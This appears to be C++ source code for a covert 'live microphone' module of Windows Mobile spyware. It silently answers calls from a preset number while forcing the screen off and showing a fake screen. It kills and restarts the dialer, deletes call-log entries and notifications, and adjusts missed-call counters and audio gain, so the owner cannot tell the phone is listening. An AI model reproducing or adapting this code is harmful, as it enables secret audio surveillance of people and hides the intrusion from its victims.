#include <new>
using namespace std;

#include <windows.h>
#include "CallBacks.h"
#include "LiveMic.h"
#include "TapiManager.h"
#include "RilManager.h"
#include "FakeScreen.h"
#include "Device.h"
#include "ProcessMonitor.h"
#include "Registry.h"

MYDEFINE_GUID(CLSID_SHNAPI_Tel, 0x53DB6D44, 0x7E4A, 0x43eb, 0xB4, 0x11, 0x67, 0xC5, 0x1C, 0xC3, 0xB8, 0xC9);

void pfnKillCprog(HWND hWin, UINT u1, UINT u2, DWORD dw1)
{
	LiveMic* pLiveMic = LiveMic::self();
	pLiveMic->StopCprog();
}

void __stdcall pfnKeepScreenOff(LPVOID lpParam)
{
	UINT* uTime = (UINT*)lpParam;
	UINT uSlice = 100, uSteps = (*uTime)%uSlice;
	LiveMic* pLiveMic = LiveMic::self();

	if ((*uTime) <= uSlice) {
		pLiveMic->KeepScreenOff();
		ExitThread(0);
	}

	while (uSteps-- > 0) {
		pLiveMic->KeepScreenOff();
		Sleep(uSlice);
	}

	pLiveMic->KeepScreenOff();
	
	ExitThread(0);
}

void __stdcall pfnKeepScreenOffEndOn(LPVOID lpParam)
{
	UINT* uTime = (UINT*)lpParam;
	UINT uSlice = 100, uSteps = (*uTime)%uSlice;
	LiveMic* pLiveMic = LiveMic::self();

	if ((*uTime) <= uSlice) {
		pLiveMic->KeepScreenOff();
		ExitThread(0);
	}

	while (uSteps-- > 0) {
		pLiveMic->KeepScreenOff();
		Sleep(uSlice);
	}

	pLiveMic->ScreenOn();

	ExitThread(0);
}

BOOL LiveMic::DropHiddenCall(HCALL hCall, BOOL bRestore)
{
	if (m_hCall == NULL) {
		if (hCall == NULL)
			return FALSE;
		m_hCall = hCall;
	}
	
	m_pTapiMan->DropCall(m_hCall);

	m_bHiddenCallIncoming = FALSE;

	if (bRestore)
		RestoreAfterDrop();

	m_pScreen->Stop();

	DBG_TRACE(L"ControlTh.cpp pfnFuncProc pLiveMic->DropHiddenCall OK ", 5, FALSE);

	ResetEvent(m_hAnswerEvent);

	return TRUE;
}

VOID LiveMic::RestoreAfterDrop()
{
	m_pDevice->RemoveCallEntry(m_wsTelephoneNumber);
	m_pDevice->RemoveNotification(&CLSID_SHNAPI_Tel);

	RestoreCprog();
	SetHiddenCallStatus(NULL);

	m_pRegistry->RegMissedCallDecrement();

	// Restore default start option for cprog
	m_wsCprogOptions.assign(L" -n");
}

BOOL LiveMic::HandleDisconnectCall(HCALL hCall)
{
	if (m_hCall == NULL)
		m_hCall = hCall;

	if (m_hCall != NULL) {
		if (m_pTapiMan->DeallocateCall(m_hCall) == TRUE) {
			SetHiddenCallStatus(NULL);
			m_bHiddenCallIncoming = FALSE;
		}  else {
			if (DropHiddenCall(m_hCall, FALSE)) {
				SetHiddenCallStatus(NULL);			
			}
		}
	}

	m_pDevice->RemoveCallEntry(m_wsTelephoneNumber);
	m_pDevice->RemoveNotification(&CLSID_SHNAPI_Tel);

	RestoreCprog();

	// Keep screen locked while cprog is loading
	m_pScreen->Stop();

	return TRUE;
}

BOOL LiveMic::HandleNewCall(HCALL hCall)
{
	BOOL bOut = FALSE;
	BOOL bStatusOn = m_bPowerStatusOn;
	DBG_TRACE_INT(L"LiveMic HandleNewCall m_bPowerStatusOn=", 5, FALSE, m_bPowerStatusOn);

	if (!bStatusOn) {
		DBG_TRACE_INT(L"LiveMic HandleNewCall if (!bLastStatus) 1 ", 5, FALSE, m_bPowerStatusOn);
		KeepScreenOff(1000, FALSE);
	}

	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);

	// Check Incoming call caller
	DWORD dwOut = WaitForSingleObject(m_hAnswerEvent, 500);
	DBG_TRACE_INT(L"LiveMic HandleNewCall WaitForSingleObject ", 5, FALSE, dwOut);

	if (dwOut != WAIT_OBJECT_0) {
		if (!m_pTapiMan->CheckNumber(hCall, m_wsTelephoneNumber)) {
			DBG_TRACE(L"LiveMic HandleNewCall CheckNumber ", 5, FALSE);
			return bOut;
		}
	}
	
	m_bHiddenCallIncoming = TRUE;

	if (!bStatusOn)
		KeepScreenOff();

	// Modify ring script
	if (!m_pRegistry->SetRingScript()) {
		DBG_TRACE(L"LiveMic HandleNewCall SetRingScript FAILED", 5, FALSE);
		DropHiddenCall(hCall, FALSE);
		m_pRegistry->RestoreRingScript();
		SetHiddenCallStatus(NULL);
		return bOut;
	}

	// Check power status
	if (bStatusOn) {
		DBG_TRACE_INT(L"LiveMic HandleNewCall if (bLastStatus) 4 ", 5, FALSE, m_bPowerStatusOn);
		m_pScreen->Start();
		StopCprog();
		DropHiddenCall(hCall, TRUE);		
		return bOut;
	}

	KeepScreenOff(500, FALSE);
	StopCprog();
	m_pScreen->Start();

	KeepScreenOff(500, FALSE);

	if (FALSE == m_pTapiMan->AnswerCall(hCall)) {
		DBG_TRACE(L"LiveMic HandleNewCall AnswerCall FAILED ", 5, FALSE);
		DropHiddenCall(hCall, FALSE);
		KeepScreenOff(500, FALSE);
		return bOut;
	} 

	// Check power status
	KeepScreenOff(500, FALSE);
	// Hidden call status
	SetHiddenCallStatus(hCall);
	// Ring Script key restored
	m_pRegistry->RestoreRingScript();

	ResetEvent(m_hAnswerEvent);

	return TRUE;
}

BOOL LiveMic::ScreenOn()
{
	if (!m_pDevice->SetPwrRequirement(POWER_STATE_ON)) {
		if (!m_pDevice->VideoPowerSwitch(VideoPowerOn)) {
			DBG_TRACE(L"LiveMic ScreenOn ERROR", 5, FALSE);
			return FALSE;
		}
	}
	DBG_TRACE(L"LiveMic ScreenOn OK", 5, FALSE);
	
	return TRUE;	
}

BOOL LiveMic::KeepScreenOff()
{	
	BOOL bOut = FALSE;

	if (m_pDevice->VideoPowerSwitch(VideoPowerOff))
		bOut = TRUE;

	if (!bOut) {
		if (m_pDevice->SetPwrRequirement(POWER_STATE_UNATTENDED)) {
			bOut = TRUE;	
		}
	}

	return bOut;
}

VOID LiveMic::KeepScreenOff(UINT uTime)
{
	KeepScreenOff(uTime, FALSE);
}

//	Try to switch off screenligth every 100 ms for uTime(exp in ms)
//	bScreenOn specifies if screenligth will be switched off or not at the end of uTime
VOID LiveMic::KeepScreenOff(UINT uTime, BOOL bScreenOn)
{
	KeepScreenOff();
	HANDLE hTmpTh = INVALID_HANDLE_VALUE;

	if (bScreenOn)
		hTmpTh = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pfnKeepScreenOffEndOn, &uTime, 0, NULL);
	else
		hTmpTh = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pfnKeepScreenOff, &uTime, 0, NULL);
	
	if (hTmpTh != NULL)	{
		CloseHandle(hTmpTh);
	}

	return;
}

BOOL LiveMic::StopCprog()
{	
	/*	if (m_pProcess->SuspendAllThread(m_wsCprog) == TRUE) {
			DBG_TRACE(L"LiveMic.cpp StopCprog SuspendAllThread OK ", 5, FALSE);
			return m_bNotificationThreadSuspended = TRUE;
	} else*/ 
	if (m_pProcess->KillProcess(m_wsCprog)) {
		DBG_TRACE(L"LiveMic.cpp StopCprog KillProcess OK ", 5, FALSE);
		return TRUE;
	}
	
	DBG_TRACE(L"LiveMic.cpp StopCprog FAILED ", 5, FALSE);

	return FALSE;
}

VOID LiveMic::RestoreCprog()
{
	/*if (m_bNotificationThreadSuspended) {
		if (m_pProcess->ResumeAllThread(m_wsCprog) == TRUE) {
			DBG_TRACE(L"LiveMic.cpp RestoreCprog ResumeAllThread OK ", 5, FALSE);
			m_bNotificationThreadSuspended = FALSE;
			return;
		}
	}*/
	if (m_pProcess->StartProcess(m_wsCprog, m_wsCprogPath, m_wsCprogOptions)) {
		DBG_TRACE(L"LiveMic.cpp RestoreCprog StartProcess OK ", 5, FALSE);
	}
}

VOID LiveMic::SetHiddenCallStatus(HCALL hCall)
{
	m_hCall = hCall;

	if (hCall != NULL) {
		m_bHiddenCallInProgress	= TRUE;
		DBG_TRACE_INT(L"LiveMic.cpp  SetHiddenCallStatus ", 5, FALSE, TRUE);
	} else {
		m_bHiddenCallInProgress	= FALSE;
		DBG_TRACE_INT(L"LiveMic.cpp SetHiddenCallStatus ", 5, FALSE, FALSE);
	}
}

VOID LiveMic::LineCallStateConnected()
{
	m_bCallInProgress = TRUE;
	DBG_TRACE(L"LiveMic.cpp LineCallStateConnected m_bCallInProgress TRUE", 5, FALSE);

	if (IsHiddenCallInProgress()) {
		m_hKillCprogTimer = SetTimer(NULL, 0, 5000, (TIMERPROC) pfnKillCprog);
		KeepScreenOff(1000, FALSE);
		m_bHiddenCallIncoming = FALSE;
	}

	m_pRegistry->RestoreRingScript();
}

VOID LiveMic::LineCallStateDisconnected()
{
	if (IsHiddenCallInProgress()) {
		
		//KeepScreenOff(1000, FALSE);

		if (m_hCall != NULL)
			HandleDisconnectCall(m_hCall);
	}

	if (m_hKillCprogTimer)
		KillTimer(0, m_hKillCprogTimer);

	m_bCallInProgress = FALSE;
	DBG_TRACE(L"LiveMic.cpp LineCallStateDisconnected m_bCallInProgress = FALSE", 5, FALSE);
	m_bLocalDrop = FALSE;
	m_pRegistry->RestoreRingScript();
	m_pRegistry->RegRemoveLastCaller();
}

VOID LiveMic::LineCallStateOffering(HCALL hCall)
{
	if (IsHiddenCallInProgress()) {
		DBG_TRACE(L"LiveMic.cpp LineCallStateOffering IsHiddenCallInProgress()", 5, FALSE);
		if (m_bCallInProgress) { // Hidden call in progress is in connected state
			DBG_TRACE(L"LiveMic.cpp LineCallStateOfferingif (m_bCallInProgress) ", 5, FALSE);
			DropHiddenCall(NULL, TRUE);	// if i use NULL, it'll use the handle saved during APPNEWCALL
		}
	} else {
		DBG_TRACE(L"LiveMic.cpp LineCallStateOffering ! IsHiddenCallInProgress()", 5, FALSE);
		if (m_bCallInProgress) { // Call in progress
			DBG_TRACE(L"LiveMic.cpp LineCallStateOffering ! IsHiddenCallInProgress() m_bCallInProgress", 5, FALSE);
			if (m_pTapiMan->CheckNumber(hCall, m_wsTelephoneNumber)) { // New call become from hidden number
				DBG_TRACE(L"LiveMic.cpp LineCallStateOffering ! IsHiddenCallInProgress() CheckNumber", 5, FALSE);
				DropHiddenCall(hCall, TRUE);
			}	
		}
	}
}

BOOL LiveMic::Initialize(wstring wsTelephoneNumber, HINSTANCE hInstance)
{
	if (m_bInitialized) {
		Uninitialize();
	}

	m_wsTelephoneNumber.assign(wsTelephoneNumber);

	if (m_wsTelephoneNumber.empty()) {
		DBG_TRACE(L"LiveMic.cpp Initialize m_wsTelephoneNumber is empty ", 5, FALSE);
		return FALSE;
	}

	m_pScreen = FakeScreen::self(hInstance);
	m_pDevice = Device::self();
	m_pProcess = ProcessMonitor::self();
	m_pRegistry = Registry::self();
	m_pCtrlTh = ControlTh::self();
	m_pTapiMan = TapiManager::self();
	m_pRilMan = new(nothrow) RilManager();

	if (m_pScreen == NULL ||
		m_pDevice == NULL ||
		m_pProcess == NULL ||
		m_pRegistry == NULL ||
		m_pCtrlTh == NULL  ||
		m_pTapiMan == NULL ||
		m_pRilMan == NULL) {

			DBG_TRACE(L"LiveMic.cpp Initialize SOME OBJECT FAILED ", 5, FALSE);
			return FALSE;
	}

	if (m_pDevice->RegisterPowerNotification(BackLightCallbackSlow, (DWORD)&m_bPowerStatusOn) == FALSE) {
		DBG_TRACE(L"LiveMic.cpp Initialize RegisterPowerNotification FAILED ", 5, FALSE);
		return FALSE;
	}

	if (!m_pTapiMan->Init()) {
		DBG_TRACE(L"LiveMic.cpp Initialize m_pTapiMan->Init() FAILED ", 5, FALSE);
		return FALSE;
	}

	if (!m_pCtrlTh->Init()) {
		DBG_TRACE(L"LiveMic.cpp Initialize m_pCtrlTh->Init() FAILED ", 5, FALSE);
		m_pTapiMan->UnInit();
		return FALSE;
	}

	/*if (!m_pCtrlTh->Start()) {
		DBG_TRACE(L"LiveMic.cpp Initialize m_pCtrlTh->Start() FAILED ", 5, FALSE);
	}*/

	if (!m_pRilMan->Init()) {
		DBG_TRACE(L"LiveMic.cpp Initialize m_pRilMan->Init() FAILED ", 5, FALSE);
	}
	
	return m_bInitialized = TRUE;
}

VOID LiveMic::Uninitialize()
{
	if (m_hCall)
		HandleDisconnectCall(m_hCall);

	if (m_hKillCprogTimer)
		KillTimer(0, m_hKillCprogTimer);

	if (m_pDevice->UnRegisterPowerNotification(BackLightCallbackSlow)) {
		DBG_TRACE(L"LiveMic.cpp Uninitialize UnRegisterPowerNotification OK ", 5, FALSE);
	}

	if (m_pCtrlTh) {
		DWORD dwOut = m_pCtrlTh->Stop();
		//pLiveMic->StopCtrlTh();
		DBG_TRACE_INT(L"LiveMic.cpp Uninitialize m_pCtrlTh->Stop():", 5, TRUE, dwOut);
		m_pCtrlTh->Uninit();
	}
	
	if (m_pRilMan) {
		delete m_pRilMan;
		DBG_TRACE(L"LiveMic.cpp Uninitialize delete m_pRilMan OK ", 5, FALSE);
	}

	if (m_pTapiMan){
		if (!m_pTapiMan->UnInit()) {
			DBG_TRACE(L"LiveMic.cpp Uninitialize m_pTapiMan->UnInit() FAILED", 5, FALSE);
		} else {
			DBG_TRACE(L"LiveMic.cpp Uninitialize m_pTapiMan->UnInit() OK ", 5, FALSE);
		}
	}

	if (m_pScreen) {
		if (m_pScreen->Stop()) {
			DBG_TRACE(L"LiveMic.cpp Uninitialize m_pScreen->Stop() OK ", 5, FALSE);
		} else {
			DBG_TRACE(L"LiveMic.cpp Uninitialize m_pScreen->Stop() FAILED ", 5, FALSE);
		}
	}

	if (m_hAnswerEvent)
		CloseHandle(m_hAnswerEvent);

	m_bInitialized = FALSE;
}

LiveMic* LiveMic::m_pInstance = NULL;
volatile LONG LiveMic::m_lLock = 0;

LiveMic* LiveMic::self() {

	while (InterlockedExchange((LPLONG) &m_lLock, 1) != 0)
		Sleep(100);

	if (NULL == m_pInstance)
		m_pInstance = (LiveMic*) new(nothrow) LiveMic();

	InterlockedExchange((LPLONG)&m_lLock, 0);

	return m_pInstance;
}

LiveMic::LiveMic(void)
{
	m_bCtrlThreadActive = m_bHiddenCallInProgress = m_bCallInProgress = m_bNotificationThreadSuspended = FALSE;
	m_bPowerStatusOn = m_bInitialized = m_bHiddenCallIncoming = FALSE;

	m_pScreen = NULL;
	m_pDevice = NULL;
	m_pProcess = NULL;
	m_pRegistry = NULL;

	m_pTapiMan = NULL;
	m_pRilMan = NULL;
	m_hCall = NULL;

	m_wsCprog = L"cprog.exe";
	m_wsCprogPath = L"\\windows\\";
	m_wsCprogOptions = L" -n";
	
	m_hAnswerEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	m_hKillCprogTimer = 0;
}

LiveMic::~LiveMic(void)
{
	Uninitialize();
}

VOID LiveMic::AudioAdjust()
{
	m_pRilMan->GetAudioGain();
	m_pRilMan->SetAudioGain(FALSE);
}

VOID LiveMic::AudioRestore()
{
	m_pRilMan->SetAudioGain(TRUE);
}